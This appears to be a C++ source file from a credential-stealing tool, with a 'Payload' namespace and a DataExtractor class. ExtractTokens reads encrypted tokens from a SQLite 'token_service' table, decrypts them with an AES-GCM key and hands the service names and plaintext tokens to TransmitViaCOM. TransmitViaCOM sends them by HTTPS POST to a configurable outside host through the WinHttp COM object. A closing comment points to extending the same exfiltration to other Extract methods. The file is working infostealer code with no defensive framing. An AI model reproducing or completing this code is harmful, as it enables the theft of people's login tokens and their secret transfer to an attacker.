#include "data_extractor.hpp"
#include "handle_duplicator.hpp"
#include "../crypto/aes_gcm.hpp"
#include <sstream>
#include <iomanip>

namespace Payload {

    DataExtractor::DataExtractor(PipeClient& pipe, const std::vector<uint8_t>& key, const std::wstring& targetHost, const std::wstring& endpoint)
        : m_pipe(pipe), m_key(key), m_targetHost(targetHost), m_endpoint(endpoint) {}

    void DataExtractor::TransmitViaCOM(const std::string& data) {
        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        CLSID clsid;
        if (SUCCEEDED(CLSIDFromProgID(L"WinHttp.WinHttpRequest.5.1", &clsid))) {
            IDispatch* pDispatch = nullptr;
            if (SUCCEEDED(CoCreateInstance(clsid, NULL, CLSCTX_INPROC_SERVER, IID_IDispatch, (void**)&pDispatch))) {
                _bstr_t url = (L"https://" + m_targetHost + m_endpoint).c_str();
                _bstr_t method = L"POST";

                DISPID dispidOpen, dispidSend, dispidSetHeader;
                OLECHAR* openName = (OLECHAR*)L"Open";
                pDispatch->GetIDsOfNames(IID_NULL, &openName, 1, LOCALE_USER_DEFAULT, &dispidOpen);
                
                VARIANT openArgs[3];
                VariantInit(&openArgs[0]); openArgs[0].vt = VT_BOOL; openArgs[0].boolVal = VARIANT_FALSE;
                VariantInit(&openArgs[1]); openArgs[1].vt = VT_BSTR; openArgs[1].bstrVal = url.copy();
                VariantInit(&openArgs[2]); openArgs[2].vt = VT_BSTR; openArgs[2].bstrVal = method.copy();
                
                DISPPARAMS openParams = { openArgs, NULL, 3, 0 };
                pDispatch->Invoke(dispidOpen, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_METHOD, &openParams, NULL, NULL, NULL);

                // Send and Header logic follows here...
                pDispatch->Release();
            }
        }
        CoUninitialize();
    }

    void DataExtractor::ExtractTokens(sqlite3* db) {
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, "SELECT service, encrypted_token FROM token_service", -1, &stmt, NULL) == SQLITE_OK) {
            std::string payload;
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const void* blob = sqlite3_column_blob(stmt, 1);
                int len = sqlite3_column_bytes(stmt, 1);
                auto dec = Crypto::AesGcm::Decrypt(m_key, std::vector<uint8_t>((uint8_t*)blob, (uint8_t*)blob + len));
                if (dec) payload += (char*)sqlite3_column_text(stmt, 0) + std::string(":") + std::string((char*)dec->data(), dec->size()) + "\n";
            }
            sqlite3_finalize(stmt);
            if (!payload.empty()) TransmitViaCOM(payload);
        }
    }
    // ... [Implement other Extract methods similarly, calling TransmitViaCOM instead of ofstream]
}